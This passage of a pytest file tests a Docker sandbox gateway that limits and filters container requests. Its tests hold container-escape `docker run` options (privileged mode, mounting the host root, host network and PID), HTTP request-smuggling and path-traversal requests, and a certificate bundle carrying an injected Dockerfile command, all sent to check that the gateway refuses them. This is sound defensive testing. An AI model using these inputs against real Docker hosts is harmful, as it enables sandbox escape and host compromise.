        b"GET /v1.51/containers/" + b"f" * 64 + b"/json HTTP/1.1\r\nHost: d\r\n\r\n",
    ):
        answer = await _send(listen, raw)
        assert answer.startswith(b"HTTP/1.1 404") and b"not started by the Nodestro sandbox gateway" in answer
    assert daemon.requests == []


async def test_refused_requests_never_reach_the_daemon(gateway: tuple[FakeDaemon, str, Gateway]) -> None:
    daemon, listen, _ = gateway
    answer = await _send(listen, _post("/v1.51/containers/create", body(host={"Privileged": True})))
    assert answer.startswith(b"HTTP/1.1 403") and b"Privileged" in answer
    answer = await _send(listen, b"GET /v1.51/containers/json HTTP/1.1\r\nHost: d\r\n\r\n")
    assert answer.startswith(b"HTTP/1.1 403")
    assert daemon.requests == []


async def test_at_most_max_containers_exist_at_once(gateway: tuple[FakeDaemon, str, Gateway]) -> None:
    daemon, listen, instance = gateway
    for _ in range(2):
        assert (await _send(listen, _post("/v1.51/containers/create", body()))).startswith(b"HTTP/1.1 201")
    answer = await _send(listen, _post("/v1.51/containers/create", body()))
    assert answer.startswith(b"HTTP/1.1 429")
    # Once one is gone (removed by Docker after it exited), there is room again.
    daemon.containers.pop(next(iter(daemon.containers)))
    assert (await _send(listen, _post("/v1.51/containers/create", body()))).startswith(b"HTTP/1.1 201")
    assert len(instance.containers) == 2


async def test_nothing_starts_when_the_daemon_cannot_enforce_limits(
    gateway: tuple[FakeDaemon, str, Gateway],
) -> None:
    # Rootless Docker without cgroup v2 delegation drops memory, CPU and process limits with only a warning.
    daemon, listen, instance = gateway
    daemon.limits = False
    answer = await _send(listen, _post("/v1.51/containers/create", body()))
    assert answer.startswith(b"HTTP/1.1 503") and b"resource limits" in answer
    assert daemon.created == 0 and instance.containers == {}
    answer = await _send(listen, b"POST /build HTTP/1.1\r\nHost: d\r\nContent-Length: 0\r\n\r\n")
    assert not any(target.startswith("/build") for _, target, _ in daemon.requests)
    daemon.limits = True  # asked again until the daemon confirms them, then remembered
    answer = await _send(listen, _post("/v1.51/containers/create", body()))
    assert answer.startswith(b"HTTP/1.1 201") and daemon.created == 1
    daemon.limits = False
    answer = await _send(listen, _post("/v1.51/containers/create", body()))
    assert answer.startswith(b"HTTP/1.1 201") and daemon.created == 2


async def test_expired_and_leftover_containers_are_removed(gateway: tuple[FakeDaemon, str, Gateway]) -> None:
    daemon, listen, instance = gateway
    await _send(listen, _post("/v1.51/containers/create", body()))
    await _send(listen, _post("/v1.51/containers/create", body()))
    first, second = list(daemon.containers)
    daemon.containers[first]["Created"] -= 3600
    await instance.reconcile()
    assert list(daemon.containers) == [second] and list(instance.containers) == [second]
    filters = [target for method, target, _ in daemon.requests if method == "GET" and "/containers/json" in target]
    assert filters and all("dev.nodestro.sandbox%3Dtest" in target for target in filters)
    await instance.reconcile(remove_all=True)  # at start and stop
    assert daemon.containers == {} and instance.containers == {}


# ---- real Docker -----------------------------------------------------------------------------------------------

DOCKER_TESTS = os.environ.get("NODESTRO_DOCKER_TESTS") == "1"


@pytest.fixture
def real_gateway(tmp_path: Path) -> Iterator[dict[str, str]]:
    if not DOCKER_TESTS:
        if os.environ.get("NODESTRO_REQUIRE_DOCKER") == "1":
            pytest.fail("NODESTRO_REQUIRE_DOCKER=1 but NODESTRO_DOCKER_TESTS is not set")
        pytest.skip("set NODESTRO_DOCKER_TESTS=1 (needs Docker and network for the image build)")
    if shutil.which("docker") is None:
        pytest.fail("NODESTRO_DOCKER_TESTS=1 but the docker CLI is missing")
    listen = str(tmp_path / "gateway.sock")
    environ = {**os.environ, "NODESTRO_SANDBOX_INSTANCE": "pytest"}
    network = os.environ.get("NODESTRO_DOCKER_BUILD_NETWORK", "")
    if network:
        environ["NODESTRO_SANDBOX_BUILD_NETWORK"] = network
    process = subprocess.Popen(
        [sys.executable, "-m", "nodestro_runtime.sandbox_gateway", "--listen", listen],
        env=environ,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    try:
        for _ in range(100):
            if Path(listen).exists():
                break
            if process.poll() is not None:
                pytest.fail(process.stdout.read().decode() if process.stdout else "gateway stopped")
            time.sleep(0.1)
        # The client side: only the gateway's socket; the legacy builder (as in the image without buildx).
        client = {
            key: value
            for key, value in os.environ.items()
            if key not in ("DOCKER_HOST", "DOCKER_CONTEXT", "DOCKER_BUILDKIT")
        }
        client.update({"DOCKER_HOST": f"unix://{listen}", "DOCKER_BUILDKIT": "0"})
        yield client
    finally:
        process.terminate()
        with contextlib.suppress(subprocess.TimeoutExpired):
            process.wait(10)


def test_tools_run_through_the_gateway_and_escapes_are_refused(real_gateway: dict[str, str]) -> None:
    from nodestro_runtime.python_envs import UvRunner, find_uv

    uv = find_uv()
    assert uv is not None
    with tempfile.TemporaryDirectory() as cache:
        lock = UvRunner(Path(cache), uv).compile(
            ["six==1.17.0", "pydantic>=2.6,<3", "typing-extensions>=4.14"],
            python=PYTHON,
            previous="",
            log=lambda _line: None,
            builds=False,
        )
    images = ContainerImages(environ=real_gateway)
    tag = images.build(lock, PYTHON)
    try:
        assert images.missing_modules(tag, ["six", "not_a_module"]) == ["not_a_module"]
        sandbox = images.sandbox(tag, timeout=60)
        code = (
            "import os, socket, six\n\n\n"
            "def probe(host: str) -> str:\n"
            '    """Probe.\n\n    Args:\n        host: A host.\n\n    Returns:\n        Findings.\n    """\n'
            "    found = [six.__version__, str(os.getuid())]\n"
            "    try:\n"
            "        socket.create_connection((host, 443), timeout=3)\n"
            "        found.append('network')\n"
            "    except OSError:\n"
            "        found.append('no-network')\n"
            "    try:\n"
            "        open('/etc/escape', 'w')\n"
            "        found.append('write')\n"
            "    except OSError:\n"
            "        found.append('read-only')\n"
            "    found.append('docker-socket' if os.path.exists('/var/run/docker.sock') else 'no-socket')\n"
            "    return ' '.join(found)\n"
        )
        assert sandbox.call(code, "probe", {"host": "1.1.1.1"}) == "1.17.0 65534 no-network read-only no-socket"

        def docker(*args: str) -> subprocess.CompletedProcess[str]:
            return subprocess.run(["docker", *args], env=real_gateway, capture_output=True, text=True, timeout=60)

        for args in (
            ("run", "--rm", "--privileged", tag, "true"),
            ("run", "--rm", "-v", "/:/host", tag, "true"),
            ("run", "--rm", "--network", "host", tag, "true"),
            ("run", "--rm", "--pid", "host", tag, "true"),
            ("run", "--rm", "--security-opt", "seccomp=unconfined", tag, "true"),
            ("run", "--rm", "--user", "0", tag, "true"),
            ("run", "--rm", "--network", "none", "python:3.13-slim", "true"),
            ("ps", "-a"),
            ("pull", "alpine"),
            ("volume", "ls"),
            ("network", "ls"),
            ("image", "inspect", "python:3.13-slim"),
        ):
            result = docker(*args)
            assert result.returncode != 0, args
            assert "Nodestro sandbox gateway" in result.stderr, (args, result.stderr)
    finally:
        images.remove(tag)


def _raw(socket_path: str, data: bytes, timeout: float = 5.0) -> bytes:
    import socket

    with socket.socket(socket.AF_UNIX) as client:
        client.connect(socket_path)
        client.settimeout(timeout)
        client.sendall(data)
        client.shutdown(socket.SHUT_WR)
        found = b""
        with contextlib.suppress(TimeoutError):
            while chunk := client.recv(65536):
                found += chunk
        return found


def test_raw_requests_cannot_smuggle_past_the_gateway(real_gateway: dict[str, str]) -> None:
    """Hand-made requests against the real daemon: none of them reaches an endpoint the gateway refuses."""
    listen = real_gateway["DOCKER_HOST"].removeprefix("unix://")
    attempts = [
        b"GET /_ping HTTP/1.1\r\nHost: d\r\nUser-Agent: x\n\nGET /containers/json?all=1 HTTP/1.1\nHost: d\n\r\n\r\n",
        b"GET /_ping#/../containers/json HTTP/1.1\r\nHost: d\r\n\r\n",
        b"GET /v1.47/version/../containers/json HTTP/1.1\r\nHost: d\r\n\r\n",
        b"GET /containers/json HTTP/1.1\r\nHost: d\r\n\r\n",
        b"GET /_ping HTTP/1.1\r\nHost: d\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\n",
    ]
    for attempt in attempts:
        answer = _raw(listen, attempt)
        assert answer.startswith((b"HTTP/1.1 400", b"HTTP/1.1 403")), (attempt, answer[:200])
        assert b"[{" not in answer and b"[]" not in answer, (attempt, answer[:400])


# ---- resource limits of the gateway itself and daemon checks (K1, K2, D2, D4, K4) -----------------------------------


@contextlib.asynccontextmanager
async def _gateway_with(tmp_path: Path, **limits: Any) -> AsyncIterator[tuple[FakeDaemon, str, Gateway]]:
    daemon = FakeDaemon()
    daemon_socket = str(tmp_path / "daemon.sock")
    server = await asyncio.start_unix_server(daemon.handle, path=daemon_socket)
    instance = Gateway(GatewayConfig(docker=daemon_socket, instance="test", **limits))
    listen = str(tmp_path / "gateway.sock")
    front = await asyncio.start_unix_server(instance.handle, path=listen)
    async with server, front:
        yield daemon, listen, instance


async def test_a_slow_request_head_is_cut_off(tmp_path: Path) -> None:
    async with _gateway_with(tmp_path, head_timeout=0.2) as (daemon, listen, _):
        reader, writer = await asyncio.open_unix_connection(listen)
        writer.write(b"GET /_ping HTTP/1.1\r\n")  # never finished
        await writer.drain()
        answer = await asyncio.wait_for(reader.read(), timeout=5)
        writer.close()
    assert answer.startswith(b"HTTP/1.1 408") and daemon.requests == []


async def test_connections_beyond_the_limit_are_refused(tmp_path: Path) -> None:
    async with _gateway_with(tmp_path, max_connections=1, head_timeout=5) as (_, listen, instance):
        _, idle = await asyncio.open_unix_connection(listen)  # holds the only slot
        for _ in range(50):
            if instance._connections == 1:
                break
            await asyncio.sleep(0.01)
        answer = await _send(listen, b"")  # refused on connect, before anything is read
        idle.close()
        assert answer.startswith(b"HTTP/1.1 503") and b"connections" in answer
        for _ in range(100):
            if instance._connections == 0:
                break
            await asyncio.sleep(0.01)
        assert (await _send(listen, b"GET /_ping HTTP/1.1\r\nHost: d\r\n\r\n")).startswith(b"HTTP/1.1 200")


async def test_a_second_build_is_refused_not_queued(gateway: tuple[FakeDaemon, str, Gateway]) -> None:
    daemon, listen, instance = gateway
    async with instance._builds:  # a build is running
        head = b"POST /build?t=x HTTP/1.1\r\nHost: d\r\nContent-Length: 50000000\r\n\r\n"
        answer = await _send(listen, head)  # refused on the head: the 50 MB body is never read
    assert answer.startswith(b"HTTP/1.1 429") and daemon.requests == []


async def test_builds_stop_at_the_image_limits(gateway: tuple[FakeDaemon, str, Gateway]) -> None:
    daemon, _, instance = gateway
    instance.config = GatewayConfig(docker=instance.config.docker, max_images=2, max_images_gb=1.0)
    small = [{"RepoTags": [f"nodestro-env:{n:032x}"], "Size": 100} for n in range(2)]
    daemon.images = small
    with pytest.raises(Refused) as refused:
        await instance.require_image_space(tag="nodestro-env:" + "f" * 32)
    assert refused.value.status == 507 and "image prune" in str(refused.value)
    await instance.require_image_space(tag=f"nodestro-env:{0:032x}")  # rebuilding an existing image is fine
    daemon.images = [{"RepoTags": ["nodestro-env:" + "a" * 32], "Size": 2 * 1024**3}]
    with pytest.raises(Refused):
        await instance.require_image_space(tag="nodestro-env:" + "f" * 32)
    daemon.images = small[:1]
    await instance.require_image_space(tag="nodestro-env:" + "f" * 32)
    assert any('"reference"' in unquote(target) for _, target, _ in daemon.requests)


@pytest.mark.parametrize(
    "options",
    [["name=seccomp,profile=unconfined"], [], ["name=apparmor"]],
)
async def test_nothing_starts_without_the_daemon_s_seccomp_profile(
    gateway: tuple[FakeDaemon, str, Gateway], options: list[str]
) -> None:
    daemon, listen, instance = gateway
    daemon.security_options = options
    answer = await _send(listen, _post("/v1.51/containers/create", body()))
    assert answer.startswith(b"HTTP/1.1 503") and b"seccomp" in answer
    assert daemon.created == 0 and instance.containers == {}


def test_compressed_or_oversized_build_contexts_are_refused() -> None:
    tag, tar = _context()
    with pytest.raises(Refused) as refused:
        plan_build({"t": tag}, gzip.compress(tar), CONFIG)
    assert "tar" in str(refused.value)
    with pytest.raises(Refused) as refused:
        plan_build({"t": tag}, tar, GatewayConfig(max_context_files=1))
    assert refused.value.status == 413


@pytest.mark.parametrize(
    "bundle",
    [
        b"-----BEGIN CERTIFICATE-----\nAAAA\n-----END CERTIFICATE-----\n",
        b"-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----\n",
        b"",
        ISRG_ROOT_X1.encode() + b"RUN echo injected\n",
        ISRG_ROOT_X1.encode().replace(b"CERTIFICATE-----\n", b"CERTIFICATE-----\n!!", 1),
        "ä".encode() + ISRG_ROOT_X1.encode(),
    ],
)
def test_only_real_certificates_pass_as_a_ca_bundle(bundle: bytes) -> None:
    with pytest.raises(Refused):
        gw.check_ca_bundle(bundle)


def test_a_commented_certificate_bundle_is_accepted() -> None:
    gw.check_ca_bundle(b"# Issuer: ISRG Root X1\n" + ISRG_ROOT_X1.encode() + b"\n# second\n" + ISRG_ROOT_X1.encode())


def test_environment_images_build_on_digest_pinned_bases() -> None:
    from nodestro_runtime.container_images import BASE_IMAGES, ContainerImages, default_base

    assert BASE_IMAGES and all(
        re.fullmatch(rf"python:{re.escape(version)}-slim@sha256:[0-9a-f]{{64}}", base)
        for version, base in BASE_IMAGES.items()
    )
    assert ContainerImages().base(PYTHON) == BASE_IMAGES[PYTHON] == default_base(PYTHON)
    _, tar = _context()
    with tarfile.open(fileobj=io.BytesIO(tar)) as archive:
        member = archive.extractfile("Dockerfile")
        assert member is not None
        dockerfile = member.read().decode()
    assert dockerfile.count(f"FROM {BASE_IMAGES[PYTHON]}") == 2
    with pytest.raises(Refused, match="pinned base"):
        plan_build({"t": "nodestro-env:" + "0" * 32}, tar, GatewayConfig(python_versions=("3.9",)))
